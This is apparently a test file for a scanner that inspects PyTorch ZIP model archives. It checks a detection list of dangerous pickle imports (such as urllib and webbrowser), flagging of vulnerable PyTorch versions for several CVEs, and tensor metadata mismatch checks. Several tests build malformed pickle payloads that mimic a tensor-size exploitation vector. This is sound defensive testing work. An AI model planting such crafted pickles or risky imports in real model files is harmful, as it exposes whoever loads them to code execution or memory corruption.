        "urllib",
        "urllib2.urlopen",
        "webbrowser",
    ],
)
def test_pytorch_zip_cve_2025_32434_dangerous_references_stay_critical(tmp_path: Path, import_reference: str) -> None:
    """Dangerous references reported exactly or by known risky prefixes remain malicious."""
    scanner = PyTorchZipScanner()
    pickle_result = _pickle_result_with_reduce(import_reference)
    pytorch_result = ScanResult(scanner_name="pytorch_zip")

    scanner._add_weights_only_safety_warnings(pickle_result, pytorch_result, str(tmp_path / "model.pt"), "data.pkl")

    check = _weights_only_analysis_check(pytorch_result)
    assert check.severity == IssueSeverity.CRITICAL
    assert import_reference in check.details["import_analysis"]["found_malicious"]


def test_pytorch_zip_cve_2026_24747_fixed_version(tmp_path: Path) -> None:
    """Model metadata with fixed version should not trigger CVE-2026-24747."""
    model_path = _create_pytorch_zip_with_framework_version(tmp_path / "model.pt", "2.10.0")
    scanner = PyTorchZipScanner()
    result = scanner.scan(str(model_path))

    # Fixed version: CVE-2026-24747 check should be present but not failed
    cve_2026_checks = [c for c in result.checks if "CVE-2026-24747" in c.name]
    assert len(cve_2026_checks) > 0, "Expected CVE-2026-24747 check to be present"
    cve_2026_failed = [c for c in cve_2026_checks if c.status == CheckStatus.FAILED]
    assert len(cve_2026_failed) == 0, (
        f"PyTorch 2.10.0 should NOT trigger CVE-2026-24747. "
        f"Failed checks: {[(c.name, c.message) for c in cve_2026_failed]}"
    )


def test_pytorch_zip_cve_2026_24747_prerelease_fix_version_is_vulnerable(tmp_path: Path) -> None:
    """A prerelease of the fixed PyTorch release should still trigger CVE-2026-24747."""
    model_path = _create_pytorch_zip_with_framework_version(tmp_path / "model.pt", "2.10.0a0")
    scanner = PyTorchZipScanner()

    result = scanner.scan(str(model_path))

    failed_checks = [
        c for c in result.checks if c.name == "CVE-2026-24747 PyTorch Version Check" and c.status == CheckStatus.FAILED
    ]
    assert len(failed_checks) > 0
    assert failed_checks[0].details.get("detected_pytorch_version") == "2.10.0a0"
    assert failed_checks[0].details.get("pytorch_version_source") == "metadata:config.json:pytorch_version"


def test_pytorch_zip_cve_2026_24747_postfix_prerelease_is_not_vulnerable(tmp_path: Path) -> None:
    """A prerelease after the fixed PyTorch release should not become a false positive."""
    model_path = _create_pytorch_zip_with_framework_version(tmp_path / "model.pt", "2.10.1a1")
    scanner = PyTorchZipScanner()

    result = scanner.scan(str(model_path))

    failed_checks = [
        c for c in result.checks if c.name == "CVE-2026-24747 PyTorch Version Check" and c.status == CheckStatus.FAILED
    ]
    assert len(failed_checks) == 0


def test_pytorch_zip_generic_version_metadata_does_not_trigger_cve_version_checks(tmp_path: Path) -> None:
    """Generic config version keys should not be treated as framework version."""
    model_path = tmp_path / "model.pt"
    with zipfile.ZipFile(model_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1.0, 2.0, 3.0]}))
        zipf.writestr("config.json", json.dumps({"version": "0.1.0", "model_type": "bert"}))

    scanner = PyTorchZipScanner()
    result = scanner.scan(str(model_path))

    cve_version_checks = [
        c
        for c in result.checks
        if c.status == CheckStatus.FAILED
        and "PyTorch Version Check" in c.name
        and any(
            cve in c.name
            for cve in [
                "CVE-2025-32434",
                "CVE-2026-24747",
                "CVE-2022-45907",
                "CVE-2024-5480",
                "CVE-2024-48063",
            ]
        )
    ]
    assert len(cve_version_checks) == 0, (
        "Generic metadata version should not trigger framework CVE checks. "
        f"Found: {[(c.name, c.message) for c in cve_version_checks]}"
    )


def test_pytorch_zip_tensor_metadata_validation(tmp_path: Path) -> None:
    """Test tensor metadata consistency validation runs without errors."""
    # Create a PyTorch ZIP model with data blobs
    zip_path = tmp_path / "model_with_data.pt"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        # Simple pickle with a dict
        data = {"weights": [1.0, 2.0, 3.0]}
        zipf.writestr("archive/data.pkl", pickle.dumps(data))
        # Add a data blob
        zipf.writestr("archive/data/0", b"\x00" * 24)  # 6 float32 values

    scanner = PyTorchZipScanner()
    result = scanner.scan(str(zip_path))

    # Should complete without crashing (best-effort validation)
    assert result is not None
    # Should not report metadata mismatches for a normal model
    mismatch_checks = [c for c in result.checks if "Tensor Metadata" in c.name and c.status == CheckStatus.FAILED]
    assert len(mismatch_checks) == 0, (
        f"Normal model should not have metadata mismatches. Failed: {[(c.name, c.message) for c in mismatch_checks]}"
    )


def test_pytorch_zip_tensor_metadata_mismatch_detection(tmp_path: Path) -> None:
    """Test that intentionally mismatched tensor metadata is detected.

    Creates a PyTorch ZIP where the pickle declares a tensor requiring more
    storage than the actual blob provides, which is the core CVE-2026-24747
    metadata-mismatch exploitation vector.
    """
    import pickletools
    import struct

    # Build a minimal pickle that references _rebuild_tensor_v2 with a
    # declared element count that wildly exceeds the actual blob size.
    # Protocol 2 GLOBAL opcode referencing torch._utils._rebuild_tensor_v2
    pkl_data = bytearray()
    pkl_data.extend(b"\x80\x02")  # PROTO 2
    pkl_data.extend(b"ctorch._utils\n_rebuild_tensor_v2\n")  # GLOBAL
    # Push storage key "0" as SHORT_BINUNICODE
    pkl_data.extend(b"\x8c\x010")  # SHORT_BINUNICODE "0"
    # Push a large element count (1_000_000) as BININT
    pkl_data.extend(b"J")  # BININT opcode
    pkl_data.extend(struct.pack("<i", 1_000_000))
    pkl_data.extend(b".")  # STOP

    # Verify our pickle is parseable by pickletools
    list(pickletools.genops(bytes(pkl_data)))

    zip_path = tmp_path / "mismatch_model.pt"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", bytes(pkl_data))
        # Blob is only 24 bytes but pickle declares 1M elements
        zipf.writestr("archive/data/0", b"\x00" * 24)

    scanner = PyTorchZipScanner()
    result = scanner.scan(str(zip_path))

    assert result is not None
    mismatch_checks = [c for c in result.checks if "Tensor Metadata" in c.name and c.status == CheckStatus.FAILED]
    assert len(mismatch_checks) > 0, (
        f"Should detect tensor storage size mismatch (24 bytes vs 1M declared elements). "
        f"Checks: {[(c.name, c.status, c.message) for c in result.checks]}"
    )


def test_pytorch_zip_tensor_metadata_parse_failure_fails_closed(tmp_path: Path) -> None:
    """Malformed full-member metadata analysis must not collapse into a clean scan."""
    zip_path = tmp_path / "malformed_tensor_metadata.pt"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", b"\x80\x02B")
        zipf.writestr("archive/data/0", b"\x00" * 24)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "pytorch_zip_tensor_metadata_validation_failed" in result.metadata["scan_outcome_reasons"]
    validation_checks = [check for check in result.checks if check.name == "CVE-2026-24747 Tensor Metadata Validation"]
    assert validation_checks
    assert validation_checks[0].message == "Tensor metadata validation could not parse pickle member archive/data.pkl"


def test_pytorch_zip_tensor_metadata_prefix_truncation_fails_closed(tmp_path: Path) -> None:
    """Late tensor metadata after the bounded validation prefix must not report clean coverage."""
    max_pkl_read = 10 * 1024 * 1024
    pkl_data = bytearray()
    pkl_data.extend(b"\x80\x02")  # PROTO 2
    payload = b"A" * (max_pkl_read + 1024)
    pkl_data.extend(b"B")  # BINBYTES
    pkl_data.extend(struct.pack("<I", len(payload)))
    pkl_data.extend(payload)
    pkl_data.extend(b"0")  # POP
    pkl_data.extend(b"ctorch._utils\n_rebuild_tensor_v2\n")
    pkl_data.extend(b"\x8c\x010")
    pkl_data.extend(b"J")
    pkl_data.extend(struct.pack("<i", 1_000_000))
    pkl_data.extend(b".")

    scanner = PyTorchZipScanner()
    mismatches, parse_complete = scanner._check_tensor_storage_mismatches(bytes(pkl_data), {"archive/data/0": 24})
    assert parse_complete is True
    assert mismatches

    zip_path = tmp_path / "late_tensor_metadata.pt"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", bytes(pkl_data))
        zipf.writestr("archive/data/0", b"\x00" * 24)

    result = scanner.scan(str(zip_path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "pytorch_zip_tensor_metadata_validation_truncated" in result.metadata["scan_outcome_reasons"]
    truncation_checks = [
        check
        for check in result.checks
        if check.name == "CVE-2026-24747 Tensor Metadata Validation"
        and check.details.get("analysis_incomplete") is True
    ]
    assert truncation_checks
    assert truncation_checks[0].message == (
        f"Tensor metadata validation only inspected the first {max_pkl_read} bytes "
        "of oversized pickle member archive/data.pkl"
    )
    assert truncation_checks[0].details["max_read_bytes"] == max_pkl_read


def test_pytorch_zip_tensor_metadata_large_auxiliary_pickle_stays_clean(tmp_path: Path) -> None:
    """Oversized non-storage sidecar pickles must not poison otherwise valid archives."""
    zip_path = tmp_path / "large_auxiliary_pickle.pt"
    payload = b"A" * ((10 * 1024 * 1024) + 1024)
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", b"\x80\x02N.")
        zipf.writestr("archive/data/0", b"\x00" * 24)
        zipf.writestr("archive/constants.pkl", b"\x80\x02B" + struct.pack("<I", len(payload)) + payload + b".")

    scanner = PyTorchZipScanner()
    result = scanner._create_result()
    scanner.current_file_path = str(zip_path)
    with zipfile.ZipFile(zip_path, "r") as zipf:
        safe_entries = zipf.infolist()
        pickle_files = scanner._discover_pickle_files(zipf, safe_entries, result)
        scanner._validate_tensor_metadata_consistency(zipf, safe_entries, pickle_files, result, str(zip_path))

    assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME
    assert not any(
        check.name == "CVE-2026-24747 Tensor Metadata Validation" and check.details.get("analysis_incomplete") is True
        for check in result.checks
    )


def _assert_tensor_metadata_inconclusive_not_cached(
    path: Path,
    cache_dir: Path,
    reason: str,
    *,
    expected_success: bool,
    expected_exit_code: int,
) -> None:
    reset_cache_manager()
    try:
        first = scan_model_directory_or_file(
            str(path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        second = scan_model_directory_or_file(
            str(path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )

        for aggregate in (first, second):
            metadata = aggregate.file_metadata[str(path)]
            assert aggregate.success is expected_success
            assert metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
            assert reason in metadata["scan_outcome_reasons"]
            assert determine_exit_code(aggregate) == expected_exit_code
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_pytorch_zip_tensor_metadata_parse_failure_is_exit1_and_not_cached(tmp_path: Path) -> None:
    zip_path = tmp_path / "malformed_tensor_metadata.pt"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", b"\x80\x02B")
        zipf.writestr("archive/data/0", b"\x00" * 24)

    _assert_tensor_metadata_inconclusive_not_cached(
        zip_path,
        tmp_path / "parse-failure-cache",
        "pytorch_zip_tensor_metadata_validation_failed",
        expected_success=True,
        expected_exit_code=1,
    )


def test_pytorch_zip_tensor_metadata_truncation_is_exit2_and_not_cached(tmp_path: Path) -> None:
    max_pkl_read = 10 * 1024 * 1024
    payload = b"A" * (max_pkl_read + 1024)
    zip_path = tmp_path / "late_tensor_metadata.pt"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr(
            "archive/data.pkl",
            b"\x80\x02B"
            + struct.pack("<I", len(payload))
            + payload
            + b"0ctorch._utils\n_rebuild_tensor_v2\n\x8c\x010J"
            + struct.pack("<i", 1_000_000)
            + b".",
        )
        zipf.writestr("archive/data/0", b"\x00" * 24)

    _assert_tensor_metadata_inconclusive_not_cached(
        zip_path,
        tmp_path / "truncation-cache",
        "pytorch_zip_tensor_metadata_validation_truncated",
        expected_success=False,
        expected_exit_code=2,
    )


# --- CVE-2022-45907 version check tests ---


def test_pytorch_zip_cve_2022_45907_version_check(tmp_path: Path) -> None:
    """Model metadata with vulnerable version should trigger CVE-2022-45907."""
    model_path = _create_pytorch_zip_with_framework_version(tmp_path / "model.pt", "1.13.0")
    scanner = PyTorchZipScanner()
    result = scanner.scan(str(model_path))

    cve_checks = [c for c in result.checks if "CVE-2022-45907" in c.name]
    failed_checks = [c for c in cve_checks if c.status == CheckStatus.FAILED]
    assert len(failed_checks) > 0, (
        f"Should flag PyTorch 1.13.0 as vulnerable to CVE-2022-45907. "
        f"Checks: {[(c.name, c.status) for c in result.checks]}"
    )
    assert failed_checks[0].details.get("detected_pytorch_version") == "1.13.0"
    assert failed_checks[0].details.get("pytorch_version_source") == "metadata:config.json:pytorch_version"
    _assert_standard_cve_details(failed_checks[0].details, "CVE-2022-45907", "1.13.0")


def test_pytorch_zip_cve_2022_45907_fixed_version(tmp_path: Path) -> None:
    """Model metadata with fixed version should not trigger CVE-2022-45907."""
    model_path = _create_pytorch_zip_with_framework_version(tmp_path / "model.pt", "1.13.1")
    scanner = PyTorchZipScanner()
    result = scanner.scan(str(model_path))

    cve_failed = [c for c in result.checks if "CVE-2022-45907" in c.name and c.status == CheckStatus.FAILED]
    assert len(cve_failed) == 0, (
        f"PyTorch 1.13.1 should NOT trigger CVE-2022-45907. Failed checks: {[(c.name, c.message) for c in cve_failed]}"
    )


# --- CVE-2024-5480 version check tests ---


def test_pytorch_zip_cve_2024_5480_version_check(tmp_path: Path) -> None:
    """Model metadata with vulnerable version should trigger CVE-2024-5480."""
    model_path = _create_pytorch_zip_with_framework_version(tmp_path / "model.pt", "2.2.2")
    scanner = PyTorchZipScanner()
    result = scanner.scan(str(model_path))

    cve_checks = [c for c in result.checks if "CVE-2024-5480" in c.name]
    failed_checks = [c for c in cve_checks if c.status == CheckStatus.FAILED]
    assert len(failed_checks) > 0, (
        f"Should flag PyTorch 2.2.2 as vulnerable to CVE-2024-5480. "
        f"Checks: {[(c.name, c.status) for c in result.checks]}"
    )
    assert failed_checks[0].details.get("detected_pytorch_version") == "2.2.2"
    assert failed_checks[0].details.get("pytorch_version_source") == "metadata:config.json:pytorch_version"
    _assert_standard_cve_details(failed_checks[0].details, "CVE-2024-5480", "2.2.2")


def test_pytorch_zip_cve_2024_5480_fixed_version(tmp_path: Path) -> None:
    """Model metadata with fixed version should not trigger CVE-2024-5480."""
    model_path = _create_pytorch_zip_with_framework_version(tmp_path / "model.pt", "2.2.3")
    scanner = PyTorchZipScanner()
    result = scanner.scan(str(model_path))

    cve_failed = [c for c in result.checks if "CVE-2024-5480" in c.name and c.status == CheckStatus.FAILED]
    assert len(cve_failed) == 0, (
        f"PyTorch 2.2.3 should NOT trigger CVE-2024-5480. Failed checks: {[(c.name, c.message) for c in cve_failed]}"
    )


# --- CVE-2024-48063 version check tests ---


def test_pytorch_zip_cve_2024_48063_version_check(tmp_path: Path) -> None:
    """Model metadata with vulnerable version should trigger CVE-2024-48063."""
    model_path = _create_pytorch_zip_with_framework_version(tmp_path / "model.pt", "2.4.1")
    scanner = PyTorchZipScanner()
    result = scanner.scan(str(model_path))

    cve_checks = [c for c in result.checks if "CVE-2024-48063" in c.name]
    failed_checks = [c for c in cve_checks if c.status == CheckStatus.FAILED]
    assert len(failed_checks) > 0, (
        f"Should flag PyTorch 2.4.1 as vulnerable to CVE-2024-48063. "
        f"Checks: {[(c.name, c.status) for c in result.checks]}"
    )
    assert failed_checks[0].details.get("detected_pytorch_version") == "2.4.1"
    assert failed_checks[0].details.get("pytorch_version_source") == "metadata:config.json:pytorch_version"
    _assert_standard_cve_details(failed_checks[0].details, "CVE-2024-48063", "2.4.1")


def test_pytorch_zip_cve_2024_48063_fixed_version(tmp_path: Path) -> None:
    """Model metadata with fixed version should not trigger CVE-2024-48063."""
    model_path = _create_pytorch_zip_with_framework_version(tmp_path / "model.pt", "2.5.0")
    scanner = PyTorchZipScanner()
    result = scanner.scan(str(model_path))

    cve_failed = [c for c in result.checks if "CVE-2024-48063" in c.name and c.status == CheckStatus.FAILED]
    assert len(cve_failed) == 0, (
        f"PyTorch 2.5.0 should NOT trigger CVE-2024-48063. Failed checks: {[(c.name, c.message) for c in cve_failed]}"
    )


def test_version_suffix_handling_for_cve_checks() -> None:
    """Version helper should treat unknown suffixes as vulnerable and known post/build as fixed."""
    scanner = PyTorchZipScanner()

    assert scanner._looks_like_pytorch_version("2.10.0a0") is True
    assert scanner._looks_like_pytorch_version("2.2.3rc1") is True

    # Known safe suffixes on fixed base version
    assert scanner._is_vulnerable_pytorch_version_for("2.2.3+cu118", 2, 2, 3) is False
    assert scanner._is_vulnerable_pytorch_version_for("2.2.3.post1", 2, 2, 3) is False

    # Known pre-release suffixes on fix version are still vulnerable
    assert scanner._is_vulnerable_pytorch_version_for("2.2.3a1", 2, 2, 3) is True
    assert scanner._is_vulnerable_pytorch_version_for("2.2.3b1", 2, 2, 3) is True
    assert scanner._is_vulnerable_pytorch_version_for("2.2.3rc1", 2, 2, 3) is True
    assert scanner._is_vulnerable_pytorch_version_for("2.2.3.dev0", 2, 2, 3) is True

    # Short prereleases above the fix release should not become false positives
    assert scanner._is_vulnerable_pytorch_version_for("2.5.1a1", 2, 2, 3) is False
    assert scanner._is_vulnerable_pytorch_version_for("2.5.1b1", 2, 2, 3) is False
    assert scanner._is_vulnerable_pytorch_version("2.6.1a1") is False
    assert scanner._is_vulnerable_pytorch_version_2026("2.10.1a1") is False

    # Prereleases of each fixed version remain vulnerable.
    assert scanner._is_vulnerable_pytorch_version("2.6.0a0") is True
    assert scanner._is_vulnerable_pytorch_version_2026("2.10.0a0") is True

    # Unknown suffix semantics -> conservative vulnerable
    assert scanner._is_vulnerable_pytorch_version_for("2.2.3foobar", 2, 2, 3) is True
